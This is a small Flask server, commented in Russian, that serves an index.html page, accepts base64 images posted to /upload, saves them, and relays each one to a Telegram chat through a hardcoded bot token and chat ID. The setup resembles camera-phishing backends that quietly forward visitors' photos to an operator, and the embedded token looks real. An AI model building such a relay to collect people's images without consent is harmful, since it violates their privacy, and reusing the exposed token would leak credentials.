from flask import Flask, request, send_from_directory
import base64
import os
from datetime import datetime
import requests

app = Flask(__name__)

# 🔑 ВСТАВЬ СЮДА СВОИ ДАННЫЕ
TOKEN = "8617292894:AAGdWOFCFJC-YneN_dX0C3UiDksgL2vGHdE"
CHAT_ID = "748569518"

# создаём папку uploads
if not os.path.exists("uploads"):
    os.makedirs("uploads")

# отдаём сайт
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

# принимаем фото
@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json['img']
        print("ПОЛУЧИЛ ДАННЫЕ")

        # убираем base64 заголовок
        img_data = data.split(',')[1]
        img_bytes = base64.b64decode(img_data)

        # имя файла
        filename = f"uploads/photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"

        # сохраняем файл
        with open(filename, "wb") as f:
            f.write(img_bytes)

        print("СОХРАНИЛ:", filename)

        # 📤 отправка в Telegram
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

        with open(filename, "rb") as photo:
            response = requests.post(
                url,
                data={"chat_id": CHAT_ID},
                files={"photo": photo}
            )

        print("ОТВЕТ ТГ:", response.text)

        return "OK"

    except Exception as e:
        print("ОШИБКА:", e)
        return "ERROR"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)